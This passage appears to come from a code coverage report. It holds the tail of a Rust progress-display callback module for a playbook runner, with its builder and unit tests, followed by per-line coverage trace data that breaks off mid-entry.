self.completed_tasks.fetch_add(1, Ordering::Relaxed) + 1;\n\n        // Update playbook progress bar\n        if let Some(bar) = self.playbook_bar.read().as_ref() {\n            let total = self.total_tasks.load(Ordering::Relaxed);\n            if total \u003e 0 {\n                bar.set_length(total);\n                bar.set_position(completed);\n            } else {\n                // If we don't know total, just show completed count\n                bar.set_length(completed + 10); // Add buffer\n                bar.set_position(completed);\n            }\n        }\n\n        // Update host stats\n        {\n            let mut stats = self.host_stats.write();\n            let host_stats = stats.entry(result.host.clone()).or_default();\n\n            if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if !result.result.success {\n                host_stats.failed += 1;\n                self.has_failures.store(true, Ordering::Relaxed);\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n        }\n\n        // Remove and finish task spinner\n        if let Some(task_state) = self.active_tasks.write().remove(\u0026key) {\n            if let Some(spinner) = task_state.spinner {\n                let status = if result.result.skipped {\n                    \"skipped\"\n                } else if !result.result.success {\n                    \"failed\"\n                } else if result.result.changed {\n                    \"changed\"\n                } else {\n                    \"ok\"\n                };\n\n                let msg = format!(\"{} on {} - {}\", result.task_name, result.host, status);\n                spinner.finish_with_message(msg);\n            } else if !self.is_tty() {\n                let status = if result.result.skipped {\n                    \"skipped\"\n                } else if !result.result.success {\n                    \"failed\"\n                } else if result.result.changed {\n                    \"changed\"\n                } else {\n                    \"ok\"\n                };\n\n                self.print_status(\n                    status,\n                    \u0026format!(\"Task: {} ({})\", result.task_name, result.host),\n                );\n            }\n        }\n\n        // Update play progress bar - mark host as having completed this task\n        // (Note: actual \"host complete\" tracking would need more context about\n        // total tasks per host, but we can show progress based on task completions)\n        if let Some(play_state) = self.current_play.write().as_mut() {\n            if let Some(bar) = \u0026play_state.progress_bar {\n                // Count unique completed hosts for this update\n                // This is a simplified approach - in practice you'd track all tasks per host\n                let hosts_with_tasks = self.host_stats.read().len();\n                bar.set_position(hosts_with_tasks as u64);\n            }\n        }\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        if !self.is_tty() {\n            self.print_progress(\u0026format!(\"Handler: {} triggered\", name));\n        }\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, _facts: \u0026Facts) {\n        if !self.is_tty() {\n            self.print_progress(\u0026format!(\"Facts gathered for {}\", host));\n        }\n    }\n}\n\n// ============================================================================\n// Builder Pattern\n// ============================================================================\n\n/// Builder for ProgressCallback with fluent configuration.\n#[derive(Debug, Clone)]\npub struct ProgressCallbackBuilder {\n    config: ProgressConfig,\n}\n\nimpl ProgressCallbackBuilder {\n    /// Create a new builder with default configuration.\n    pub fn new() -\u003e Self {\n        Self {\n            config: ProgressConfig::default(),\n        }\n    }\n\n    /// Enable or disable colored output.\n    pub fn use_color(mut self, use_color: bool) -\u003e Self {\n        self.config.use_color = use_color;\n        self\n    }\n\n    /// Set the playbook progress bar template.\n    pub fn playbook_template(mut self, template: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.playbook_template = template.into();\n        self\n    }\n\n    /// Set the play progress bar template.\n    pub fn play_template(mut self, template: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.play_template = template.into();\n        self\n    }\n\n    /// Set the task spinner template.\n    pub fn task_template(mut self, template: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.task_template = template.into();\n        self\n    }\n\n    /// Set the spinner tick interval in milliseconds.\n    pub fn spinner_tick_ms(mut self, ms: u64) -\u003e Self {\n        self.config.spinner_tick_ms = ms;\n        self\n    }\n\n    /// Enable or disable task spinners.\n    pub fn show_task_spinners(mut self, show: bool) -\u003e Self {\n        self.config.show_task_spinners = show;\n        self\n    }\n\n    /// Enable or disable elapsed time display.\n    pub fn show_elapsed(mut self, show: bool) -\u003e Self {\n        self.config.show_elapsed = show;\n        self\n    }\n\n    /// Enable or disable ETA display.\n    pub fn show_eta(mut self, show: bool) -\u003e Self {\n        self.config.show_eta = show;\n        self\n    }\n\n    /// Set the maximum number of concurrent task spinners.\n    pub fn max_task_spinners(mut self, max: usize) -\u003e Self {\n        self.config.max_task_spinners = max;\n        self\n    }\n\n    /// Build the ProgressCallback.\n    pub fn build(self) -\u003e ProgressCallback {\n        ProgressCallback::with_config(self.config)\n    }\n}\n\nimpl Default for ProgressCallbackBuilder {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n// ============================================================================\n// Unit Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n\n    #[test]\n    fn test_progress_callback_creation() {\n        let callback = ProgressCallback::new();\n        assert!(callback.config.use_color || std::env::var(\"NO_COLOR\").is_ok());\n    }\n\n    #[test]\n    fn test_progress_config_default() {\n        let config = ProgressConfig::default();\n        assert!(config.use_color);\n        assert!(config.show_task_spinners);\n        assert!(config.show_elapsed);\n        assert!(!config.show_eta);\n        assert_eq!(config.max_task_spinners, 5);\n        assert_eq!(config.spinner_tick_ms, 80);\n    }\n\n    #[test]\n    fn test_builder_pattern() {\n        let callback = ProgressCallbackBuilder::new()\n            .use_color(false)\n            .show_task_spinners(false)\n            .max_task_spinners(10)\n            .spinner_tick_ms(100)\n            .build();\n\n        assert!(!callback.config.use_color);\n        assert!(!callback.config.show_task_spinners);\n        assert_eq!(callback.config.max_task_spinners, 10);\n        assert_eq!(callback.config.spinner_tick_ms, 100);\n    }\n\n    #[test]\n    fn test_task_key_generation() {\n        let key = ProgressCallback::task_key(\"Install nginx\", \"webserver1\");\n        assert_eq!(key, \"Install nginx:webserver1\");\n    }\n\n    #[test]\n    fn test_format_duration() {\n        assert_eq!(\n            ProgressCallback::format_duration(Duration::from_millis(500)),\n            \"500ms\"\n        );\n        assert_eq!(\n            ProgressCallback::format_duration(Duration::from_secs(5)),\n            \"5.00s\"\n        );\n        assert_eq!(\n            ProgressCallback::format_duration(Duration::from_secs(65)),\n            \"1m 5s\"\n        );\n        assert_eq!(\n            ProgressCallback::format_duration(Duration::from_secs(3665)),\n            \"1h 1m 5s\"\n        );\n    }\n\n    #[tokio::test]\n    async fn test_callback_lifecycle() {\n        let callback = ProgressCallback::new();\n\n        // Simulate playbook execution\n        callback.on_playbook_start(\"test_playbook\").await;\n\n        assert_eq!(\n            callback.playbook_name.read().as_ref().map(|s| s.as_str()),\n            Some(\"test_playbook\")\n        );\n        assert!(callback.playbook_start.read().is_some());\n\n        callback\n            .on_play_start(\"test_play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        assert!(callback.current_play.read().is_some());\n\n        callback.on_task_start(\"Install nginx\", \"host1\").await;\n\n        // Verify task is tracked\n        let key = ProgressCallback::task_key(\"Install nginx\", \"host1\");\n        assert!(callback.active_tasks.read().contains_key(\u0026key));\n\n        // Complete task\n        let result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"Install nginx\".to_string(),\n            result: ModuleResult::changed(\"Installed\"),\n            duration: Duration::from_millis(500),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026result).await;\n\n        // Verify task is no longer active\n        assert!(!callback.active_tasks.read().contains_key(\u0026key));\n\n        // Verify stats updated\n        let stats = callback.host_stats.read();\n        assert_eq!(stats.get(\"host1\").map(|s| s.changed), Some(1));\n\n        callback.on_play_end(\"test_play\", true).await;\n        callback.on_playbook_end(\"test_playbook\", true).await;\n    }\n\n    #[tokio::test]\n    async fn test_host_stats_tracking() {\n        let callback = ProgressCallback::new();\n\n        callback.on_playbook_start(\"test\").await;\n        callback\n            .on_play_start(\"test_play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // OK result\n        let ok_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task1\".to_string(),\n            result: ModuleResult::ok(\"OK\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026ok_result).await;\n\n        // Changed result\n        let changed_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task2\".to_string(),\n            result: ModuleResult::changed(\"Changed\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026changed_result).await;\n\n        // Failed result\n        let failed_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task3\".to_string(),\n            result: ModuleResult {\n                success: false,\n                changed: false,\n                message: \"Failed\".to_string(),\n                skipped: false,\n                data: None,\n                warnings: vec![],\n            },\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026failed_result).await;\n\n        // Skipped result\n        let skipped_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task4\".to_string(),\n            result: ModuleResult::skipped(\"Skipped\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        let stats = callback.host_stats.read();\n        let host_stats = stats.get(\"host1\").unwrap();\n\n        assert_eq!(host_stats.ok, 1);\n        assert_eq!(host_stats.changed, 1);\n        assert_eq!(host_stats.failed, 1);\n        assert_eq!(host_stats.skipped, 1);\n\n        assert!(callback.has_failures.load(Ordering::Relaxed));\n    }\n\n    #[test]\n    fn test_clone() {\n        let callback1 = ProgressCallback::new();\n        callback1.total_tasks.store(10, Ordering::Relaxed);\n        callback1.completed_tasks.store(5, Ordering::Relaxed);\n\n        let callback2 = callback1.clone();\n\n        assert_eq!(callback2.total_tasks.load(Ordering::Relaxed), 10);\n        assert_eq!(callback2.completed_tasks.load(Ordering::Relaxed), 5);\n    }\n\n    #[test]\n    fn test_default() {\n        let callback = ProgressCallback::default();\n        assert!(callback.playbook_name.read().is_none());\n        assert_eq!(callback.completed_tasks.load(Ordering::Relaxed), 0);\n    }\n}\n","traces":[{"line":74,"address":[32002571,32002272,32002565],"length":1,"stats":{"Line":1}},{"line":77,"address":[32002286],"length":1,"stats":{"Line":1}},{"line":78,"address":[32002322],"length":1,"stats":{"Line":1}},{"line":79,"address":[32002378],"length":1,"stats":{"Line":1}},{"line":192,"address":[31998016],"length":1,"stats":{"Line":1}},{"line":193,"address":[31998030],"length":1,"stats":{"Line":1}},{"line":197,"address":[31993917,31992304,31993851],"length":1,"stats":{"Line":1}},{"line":199,"address":[31992326,31992436],"length":1,"stats":{"Line":2}},{"line":202,"address":[31992476,31992711],"length":1,"stats":{"Line":2}},{"line":205,"address":[31992533],"length":1,"stats":{"Line":1}},{"line":209,"address":[31992836,31992689],"length":1,"stats":{"Line":2}},{"line":210,"address":[31992869],"length":1,"stats":{"Line":1}},{"line":211,"address":[31992919],"length":1,"stats":{"Line":1}},{"line":212,"address":[31993003],"length":1,"stats":{"Line":1}},{"line":213,"address":[31993051],"length":1,"stats":{"Line":1}},{"line":214,"address":[31993096],"length":1,"stats":{"Line":1}},{"line":215,"address":[31993137],"length":1,"stats":{"Line":1}},{"line":216,"address":[31993182],"length":1,"stats":{"Line":1}},{"line":217,"address":[31993321,31993261],"length":1,"stats":{"Line":2}},{"line":218,"address":[31993386,31993332],"length":1,"stats":{"Line":2}},{"line":219,"address":[31993412],"length":1,"stats":{"Line":1}},{"line":220,"address":[31993456],"length":1,"stats":{"Line":1}},{"line":225,"address":[31998080],"length":1,"stats":{"Line":1}},{"line":226,"address":[31998085],"length":1,"stats":{"Line":1}},{"line":230,"address":[31997932,31997280,31997986],"length":1,"stats":{"Line":0}},{"line":231,"address":[31997300],"length":1,"stats":{"Line":0}},{"line":232,"address":[31997325],"length":1,"stats":{"Line":0}},{"line":235,"address":[31997341],"length":1,"stats":{"Line":0}},{"line":236,"address":[31997383,31997454],"length":1,"stats":{"Line":0}},{"line":237,"address":[31997943,31997500],"length":1,"stats":{"Line":0}},{"line":239,"address":[31997475],"length":1,"stats":{"Line":0}},{"line":241,"address":[31997520],"length":1,"stats":{"Line":0}},{"line":242,"address":[31997575,31997629,31997857],"length":1,"stats":{"Line":0}},{"line":243,"address":[31997724,31997922,31997782,31997670],"length":1,"stats":{"Line":0}},{"line":245,"address":[31997655,31997867],"length":1,"stats":{"Line":0}},{"line":249,"address":[31995701,31995456,31995733],"length":1,"stats":{"Line":0}},{"line":250,"address":[31995486,31995592],"length":1,"stats":{"Line":0}},{"line":251,"address":[31995714,31995524,31995541,31995600],"length":1,"stats":{"Line":0}},{"line":252,"address":[31995635],"length":1,"stats":{"Line":0}},{"line":257,"address":[31986368,31986617,31986649],"length":1,"stats":{"Line":0}},{"line":258,"address":[31986398,31986508],"length":1,"stats":{"Line":0}},{"line":259,"address":[31986457,31986516,31986436,31986630],"length":1,"stats":{"Line":0}},{"line":260,"address":[33182453,33182432],"length":1,"stats":{"Line":0}},{"line":265,"address":[31986894,31986862,31986656],"length":1,"stats":{"Line":0}},{"line":266,"address":[31986685,31986788],"length":1,"stats":{"Line":0}},{"line":267,"address":[31986744,31986796,31986875,31986723],"length":1,"stats":{"Line":0}},{"line":268,"address":[31986832],"length":1,"stats":{"Line":0}},{"line":272,"address":[31998112],"length":1,"stats":{"Line":1}},{"line":273,"address":[31998148],"length":1,"stats":{"Line":1}},{"line":277,"address":[31996156,31995744,31996150],"length":1,"stats":{"Line":1}},{"line":278,"address":[31995769],"length":1,"stats":{"Line":1}},{"line":279,"address":[31995990,31995884],"length":1,"stats":{"Line":1}},{"line":281,"address":[31995775],"length":1,"stats":{"Line":0}},{"line":286,"address":[31994412,31994406,31993952],"length":1,"stats":{"Line":1}},{"line":288,"address":[31994034],"length":1,"stats":{"Line":1}},{"line":289,"address":[31994093],"length":1,"stats":{"Line":0}},{"line":290,"address":[31994764],"length":1,"stats":{"Line":0}},{"line":292,"address":[31994736],"length":1,"stats":{"Line":0}},{"line":295,"address":[31994065],"length":1,"stats":{"Line":1}},{"line":296,"address":[31994146],"length":1,"stats":{"Line":1}},{"line":297,"address":[31994622],"length":1,"stats":{"Line":1}},{"line":299,"address":[31994594],"length":1,"stats":{"Line":0}},{"line":302,"address":[31994118],"length":1,"stats":{"Line":0}},{"line":303,"address":[31994199],"length":1,"stats":{"Line":0}},{"line":304,"address":[31994453],"length":1,"stats":{"Line":0}},{"line":306,"address":[31994425],"length":1,"stats":{"Line":0}},{"line":309,"address":[31994171],"length":1,"stats":{"Line":0}},{"line":310,"address":[31994242],"length":1,"stats":{"Line":0}},{"line":311,"address":[31994295],"length":1,"stats":{"Line":0}},{"line":313,"address":[31994270],"length":1,"stats":{"Line":0}},{"line":316,"address":[31994224],"length":1,"stats":{"Line":0}},{"line":319,"address":[31994255],"length":1,"stats":{"Line":1}},{"line":320,"address":[31995163],"length":1,"stats":{"Line":1}},{"line":327,"address":[31994998,31994883],"length":1,"stats":{"Line":0}},{"line":332,"address":[31996176],"length":1,"stats":{"Line":1}},{"line":333,"address":[31996202],"length":1,"stats":{"Line":1}},{"line":334,"address":[31996217],"length":1,"stats":{"Line":1}},{"line":336,"address":[31996231],"length":1,"stats":{"Line":1}},{"line":337,"address":[31996259],"length":1,"stats":{"Line":1}},{"line":338,"address":[31996279],"length":1,"stats":{"Line":1}},{"line":339,"address":[31996312],"length":1,"stats":{"Line":1}},{"line":340,"address":[31996332],"length":1,"stats":{"Line":1}},{"line":341,"address":[31996242],"length":1,"stats":{"Line":1}},{"line":342,"address":[31996612],"length":1,"stats":{"Line":1}},{"line":343,"address":[31996635],"length":1,"stats":{"Line":1}},{"line":344,"address":[31996658],"length":1,"stats":{"Line":1}},{"line":345,"address":[31996595],"length":1,"stats":{"Line":1}},{"line":346,"address":[31997010],"length":1,"stats":{"Line":1}},{"line":348,"address":[31996872],"length":1,"stats":{"Line":1}},{"line":353,"address":[31985118,31984336,31986350],"length":1,"stats":{"Line":1}},{"line":355,"address":[31984372],"length":1,"stats":{"Line":1}},{"line":356,"address":[31984409,31984471,31984584],"length":1,"stats":{"Line":3}},{"line":357,"address":[31984651,31985946],"length":1,"stats":{"Line":0}},{"line":358,"address":[31985978],"length":1,"stats":{"Line":0}},{"line":363,"address":[31984823,31984711],"length":1,"stats":{"Line":2}},{"line":364,"address":[31984944,31984893],"length":1,"stats":{"Line":0}},{"line":365,"address":[31984976],"length":1,"stats":{"Line":0}},{"line":370,"address":[31985217,31985329],"length":1,"stats":{"Line":2}},{"line":371,"address":[31985404,31985492],"length":1,"stats":{"Line":0}},{"line":372,"address":[31985500],"length":1,"stats":{"Line":0}},{"line":374,"address":[31985523],"length":1,"stats":{"Line":0}},{"line":375,"address":[31985556,31985607],"length":1,"stats":{"Line":0}},{"line":377,"address":[31985529,31985583],"length":1,"stats":{"Line":0}},{"line":382,"address":[31985805,31985921,31985614,31985747],"length":1,"stats":{"Line":1}},{"line":386,"address":[31987513,31986912,31992283],"length":1,"stats":{"Line":1}},{"line":387,"address":[31986969],"length":1,"stats":{"Line":1}},{"line":388,"address":[31987012,31987097],"length":1,"stats":{"Line":2}},{"line":390,"address":[31987105,31987163,31988444],"length":1,"stats":{"Line":3}},{"line":391,"address":[31987221,31987169],"length":1,"stats":{"Line":2}},{"line":392,"address":[31987248],"length":1,"stats":{"Line":1}},{"line":393,"address":[31987578,31987653,31987737],"length":1,"stats":{"Line":1}},{"line":399,"address":[31987328,31987254],"length":1,"stats":{"Line":0}},{"line":403,"address":[31987495,31988012],"length":1,"stats":{"Line":2}},{"line":404,"address":[31988058,31988138],"length":1,"stats":{"Line":2}},{"line":406,"address":[31988145,31988343],"length":1,"stats":{"Line":2}},{"line":407,"address":[31988457,31988406],"length":1,"stats":{"Line":2}},{"line":408,"address":[31988563],"length":1,"stats":{"Line":1}},{"line":409,"address":[31988696,31989032],"length":1,"stats":{"Line":2}},{"line":410,"address":[31989262,31989038],"length":1,"stats":{"Line":0}},{"line":411,"address":[31989080],"length":1,"stats":{"Line":1}},{"line":412,"address":[31989225,31989117],"length":1,"stats":{"Line":2}},{"line":414,"address":[31989161,31989086],"length":1,"stats":{"Line":2}},{"line":417,"address":[31989190,31989430,31989362],"length":1,"stats":{"Line":3}},{"line":427,"address":[31988577,31988711],"length":1,"stats":{"Line":0}},{"line":442,"address":[31987203,31990830],"length":1,"stats":{"Line":2}},{"line":443,"address":[31990885,31990940],"length":1,"stats":{"Line":2}},{"line":444,"address":[31990963],"length":1,"stats":{"Line":1}},{"line":445,"address":[31990977],"length":1,"stats":{"Line":1}},{"line":446,"address":[31991007],"length":1,"stats":{"Line":1}},{"line":447,"address":[31991306,31991342],"length":1,"stats":{"Line":2}},{"line":449,"address":[31991337,31991275],"length":1,"stats":{"Line":0}},{"line":452,"address":[31990991],"length":1,"stats":{"Line":0}},{"line":453,"address":[31991159,31991053],"length":1,"stats":{"Line":0}},{"line":455,"address":[31991022,31991128],"length":1,"stats":{"Line":0}},{"line":459,"address":[31991502,31991130],"length":1,"stats":{"Line":2}},{"line":460,"address":[31991529],"length":1,"stats":{"Line":1}},{"line":461,"address":[31991933,31991852],"length":1,"stats":{"Line":1}},{"line":468,"address":[31991648,31991543],"length":1,"stats":{"Line":0}},{"line":475,"address":[32002592],"length":1,"stats":{"Line":1}},{"line":476,"address":[32002600],"length":1,"stats":{"Line":1}},{"line":481,"address":[32002095,32002245,32000208],"length":1,"stats":{"Line":1}},{"line":483,"address":[32000255],"length":1,"stats":{"Line":1}},{"line":484,"address":[32000268,32000338],"length":1,"stats":{"Line":2}},{"line":485,"address":[32000392],"length":1,"stats":{"Line":1}},{"line":486,"address":[32000440,32000508,32000581],"length":1,"stats":{"Line":3}},{"line":487,"address":[32000702,32000775,32000631],"length":1,"stats":{"Line":3}},{"line":488,"address":[32000804],"length":1,"stats":{"Line":1}},{"line":489,"address":[32000879],"length":1,"stats":{"Line":1}},{"line":490,"address":[32000946],"length":1,"stats":{"Line":1}},{"line":491,"address":[32000991],"length":1,"stats":{"Line":1}},{"line":492,"address":[32001130,32001070],"length":1,"stats":{"Line":2}},{"line":493,"address":[32001145,32001208],"length":1,"stats":{"Line":2}},{"line":494,"address":[32001257],"length":1,"stats":{"Line":1}},{"line":495,"address":[32001443,32001331],"length":1,"stats":{"Line":2}},{"line":502,"address":[33176272,33176128,33177628,33176159,33176691,33177612,33178657],"length":1,"stats":{"Line":4}},{"line":504,"address":[33176294,33176554,33176486,33178599,33176245],"length":1,"stats":{"Line":1}},{"line":505,"address":[33176730],"length":1,"stats":{"Line":1}},{"line":506,"address":[33176936],"length":1,"stats":{"Line":1}},{"line":507,"address":[33176962],"length":1,"stats":{"Line":1}},{"line":508,"address":[33176988],"length":1,"stats":{"Line":1}},{"line":509,"address":[33177014],"length":1,"stats":{"Line":1}},{"line":510,"address":[33177148],"length":1,"stats":{"Line":1}},{"line":511,"address":[33177282],"length":1,"stats":{"Line":1}},{"line":513,"address":[33177308],"length":1,"stats":{"Line":1}},{"line":515,"address":[33177376,33177639],"length":1,"stats":{"Line":0}},{"line":516,"address":[33177770,33177694],"length":1,"stats":{"Line":0}},{"line":517,"address":[33177829,33177877],"length":1,"stats":{"Line":0}},{"line":518,"address":[33177912],"length":1,"stats":{"Line":0}},{"line":519,"address":[33178074],"length":1,"stats":{"Line":0}},{"line":520,"address":[33178367,33178309,33178130,33178523],"length":1,"stats":{"Line":0}},{"line":523,"address":[33177337,33177391],"length":1,"stats":{"Line":2}},{"line":527,"address":[33171752,33171842,33171664,33171773,33171683],"length":1,"stats":{"Line":4}},{"line":528,"address":[33171742],"length":1,"stats":{"Line":1}},{"line":529,"address":[33171817],"length":1,"stats":{"Line":1}},{"line":532,"address":[31982285],"length":1,"stats":{"Line":4}},{"line":535,"address":[33164647,33164533],"length":1,"stats":{"Line":2}},{"line":536,"address":[33164655,33164743],"length":1,"stats":{"Line":2}},{"line":537,"address":[33168397,33164865],"length":1,"stats":{"Line":2}},{"line":542,"address":[33164906,33165030],"length":1,"stats":{"Line":2}},{"line":543,"address":[33165151,33165100],"length":1,"stats":{"Line":0}},{"line":544,"address":[33165183],"length":1,"stats":{"Line":0}},{"line":548,"address":[33165427,33168296],"length":1,"stats":{"Line":1}},{"line":550,"address":[33165526,33166787,33166893],"length":1,"stats":{"Line":0}},{"line":551,"address":[33166942,33166850],"length":1,"stats":{"Line":0}},{"line":552,"address":[33166993,33167041],"length":1,"stats":{"Line":0}},{"line":553,"address":[33167076],"length":1,"stats":{"Line":0}},{"line":554,"address":[33167238],"length":1,"stats":{"Line":0}},{"line":555,"address":[33167286],"length":1,"stats":{"Line":0}},{"line":557,"address":[33166873],"length":1,"stats":{"Line":0}},{"line":560,"address":[33168060,33167988,33168071,33167646],"length":1,"stats":{"Line":0}},{"line":561,"address":[33167385],"length":1,"stats":{"Line":0}},{"line":562,"address":[33167455],"length":1,"stats":{"Line":0}},{"line":563,"address":[33167464],"length":1,"stats":{"Line":0}},{"line":564,"address":[33167524],"length":1,"stats":{"Line":0}},{"line":565,"address":[33167564],"length":1,"stats":{"Line":0}},{"line":568,"address":[33165541,33165456],"length":1,"stats":{"Line":2}},{"line":570,"address":[33166380,33166466,33166454,33166038],"length":1,"stats":{"Line":3}},{"line":571,"address":[33165805],"length":1,"stats":{"Line":1}},{"line":572,"address":[33165875],"length":1,"stats":{"Line":1}},{"line":573,"address":[33165884],"length":1,"stats":{"Line":1}},{"line":574,"address":[33165944],"length":1,"stats":{"Line":1}},{"line":575,"address":[33165956],"length":1,"stats":{"Line":1}},{"line":580,"address":[33163040,33163186,33163681,33163068,33164364,33163159],"length":1,"stats":{"Line":4}},{"line":581,"address":[33163305,33163133,33163230],"length":1,"stats":{"Line":3}},{"line":582,"address":[33163424,33163369],"length":1,"stats":{"Line":1}},{"line":583,"address":[33163472],"length":1,"stats":{"Line":0}},{"line":584,"address":[33163613,33163524],"length":1,"stats":{"Line":0}},{"line":586,"address":[33163497,33163592],"length":1,"stats":{"Line":0}},{"line":588,"address":[33163483,33163691,33163594,33163551],"length":1,"stats":{"Line":2}},{"line":589,"address":[33163697],"length":1,"stats":{"Line":1}},{"line":590,"address":[33163753],"length":1,"stats":{"Line":1}},{"line":591,"address":[33164242,33163842],"length":1,"stats":{"Line":2}},{"line":595,"address":[33163830],"length":1,"stats":{"Line":1}},{"line":601,"address":[31982365],"length":1,"stats":{"Line":4}},{"line":602,"address":[33168621,33168735],"length":1,"stats":{"Line":2}},{"line":603,"address":[33168814,33168743],"length":1,"stats":{"Line":2}},{"line":605,"address":[33168822,33171484,33168917,33168881],"length":1,"stats":{"Line":2}},{"line":607,"address":[33168931,33169971],"length":1,"stats":{"Line":0}},{"line":609,"address":[33170123,33170097],"length":1,"stats":{"Line":0}},{"line":610,"address":[33170222,33170133,33170316],"length":1,"stats":{"Line":0}},{"line":611,"address":[33170277,33170365],"length":1,"stats":{"Line":0}},{"line":612,"address":[33170464,33170416],"length":1,"stats":{"Line":0}},{"line":613,"address":[33170499],"length":1,"stats":{"Line":0}},{"line":614,"address":[33170721],"length":1,"stats":{"Line":0}},{"line":615,"address":[33170769],"length":1,"stats":{"Line":0}},{"line":617,"address":[33170296],"length":1,"stats":{"Line":0}},{"line":620,"address":[33170103],"length":1,"stats":{"Line":0}},{"line":623,"address":[33170153,33170909,33171399],"length":1,"stats":{"Line":0}},{"line":624,"address":[33170982],"length":1,"stats":{"Line":0}},{"line":625,"address":[33171288],"length":1,"stats":{"Line":0}},{"line":626,"address":[33171030],"length":1,"stats":{"Line":0}},{"line":627,"address":[33171106],"length":1,"stats":{"Line":0}},{"line":628,"address":[33171174],"length":1,"stats":{"Line":0}},{"line":629,"address":[33171214],"length":1,"stats":{"Line":0}},{"line":632,"address":[33168895,33170863,33171476,33168970,33171602,33170182],"length":1,"stats":{"Line":2}},{"line":633,"address":[33168984,33169065],"length":1,"stats":{"Line":2}},{"line":635,"address":[33169823,33169327],"length":1,"stats":{"Line":2}},{"line":636,"address":[33169434],"length":1,"stats":{"Line":1}},{"line":637,"address":[33169712],"length":1,"stats":{"Line":1}},{"line":638,"address":[33169482],"length":1,"stats":{"Line":1}},{"line":639,"address":[33169558],"length":1,"stats":{"Line":1}},{"line":640,"address":[33169626],"length":1,"stats":{"Line":1}},{"line":641,"address":[33169638],"length":1,"stats":{"Line":1}},{"line":647,"address":[31982510],"length":1,"stats":{"Line":4}},{"line":648,"address":[33171981,33172121],"length":1,"stats":{"Line":2}},{"line":651,"address":[33172357,33172284,33172203],"length":1,"stats":{"Line":2}},{"line":654,"address":[33172328,33172385,33172464],"length":1,"stats":{"Line":3}},{"line":655,"address":[33172558,33172608],"length":1,"stats":{"Line":0}},{"line":656,"address":[33172616],"length":1,"stats":{"Line":0}},{"line":657,"address":[33172668],"length":1,"stats":{"Line":0}},{"line":658,"address":[33172775],"length":1,"stats":{"Line":0}},{"line":661,"address":[33172630,33172695],"length":1,"stats":{"Line":0}},{"line":662,"address":[33172743],"length":1,"stats":{"Line":0}},{"line":668,"address":[33172799],"length":1,"stats":{"Line":1}},{"line":669,"address":[33172852,33172915],"length":1,"stats":{"Line":2}},{"line":671,"address":[33173372,33173016],"length":1,"stats":{"Line":2}},{"line":672,"address":[33173369,33173060,33173377],"length":1,"stats":{"Line":2}},{"line":673,"address":[33173037],"length":1,"stats":{"Line":1}},{"line":674,"address":[33173163,33173096,33173187],"length":1,"stats":{"Line":2}},{"line":675,"address":[33173166,33173208],"length":1,"stats":{"Line":2}},{"line":676,"address":[33173293,33173331,33173125],"length":1,"stats":{"Line":3}},{"line":677,"address":[33173333,33173328,33173261],"length":1,"stats":{"Line":2}},{"line":679,"address":[33173295,33173236,33173291],"length":1,"stats":{"Line":2}},{"line":684,"address":[33173526,33173406],"length":1,"stats":{"Line":2}},{"line":685,"address":[33173655,33173596],"length":1,"stats":{"Line":1}},{"line":686,"address":[33173790,33173879,33173703],"length":1,"stats":{"Line":0}},{"line":687,"address":[33173763],"length":1,"stats":{"Line":0}},{"line":688,"address":[33173847,33173748,33173969,33173822],"length":1,"stats":{"Line":0}},{"line":689,"address":[33173795],"length":1,"stats":{"Line":0}},{"line":690,"address":[33173908,33173832,33173937],"length":1,"stats":{"Line":0}},{"line":691,"address":[33173910],"length":1,"stats":{"Line":0}},{"line":693,"address":[33173881],"length":1,"stats":{"Line":0}},{"line":696,"address":[33173979,33174093],"length":1,"stats":{"Line":0}},{"line":697,"address":[33174295],"length":1,"stats":{"Line":0}},{"line":698,"address":[33173726,33174302,33174397,33174049],"length":1,"stats":{"Line":2}},{"line":699,"address":[33174411,33174563,33174474],"length":1,"stats":{"Line":2}},{"line":700,"address":[33174447],"length":1,"stats":{"Line":0}},{"line":701,"address":[33174506,33174531,33174653,33174432],"length":1,"stats":{"Line":3}},{"line":702,"address":[33174479],"length":1,"stats":{"Line":0}},{"line":703,"address":[33174516,33174621,33174592],"length":1,"stats":{"Line":2}},{"line":704,"address":[33174594],"length":1,"stats":{"Line":1}},{"line":706,"address":[33174565],"length":1,"stats":{"Line":0}},{"line":709,"address":[33174977],"length":1,"stats":{"Line":1}},{"line":710,"address":[33174663],"length":1,"stats":{"Line":1}},{"line":711,"address":[33174689],"length":1,"stats":{"Line":1}},{"line":719,"address":[33175102,33175254,33175177],"length":1,"stats":{"Line":3}},{"line":720,"address":[33175400,33175326],"length":1,"stats":{"Line":1}},{"line":723,"address":[33175408],"length":1,"stats":{"Line":0}},{"line":724,"address":[33175559],"length":1,"stats":{"Line":0}},{"line":729,"address":[31982707],"length":1,"stats":{"Line":0}},{"line":730,"address":[33178766,33178847],"length":1,"stats":{"Line":0}},{"line":731,"address":[33178858,33178910],"length":1,"stats":{"Line":0}},{"line":735,"address":[31982568],"length":1,"stats":{"Line":0}},{"line":736,"address":[33175758,33175839],"length":1,"stats":{"Line":0}},{"line":737,"address":[33175850,33175902],"length":1,"stats":{"Line":0}},{"line":754,"address":[31998544],"length":1,"stats":{"Line":1}},{"line":756,"address":[31998558],"length":1,"stats":{"Line":1}},{"line":761,"address":[31998720],"length":1,"stats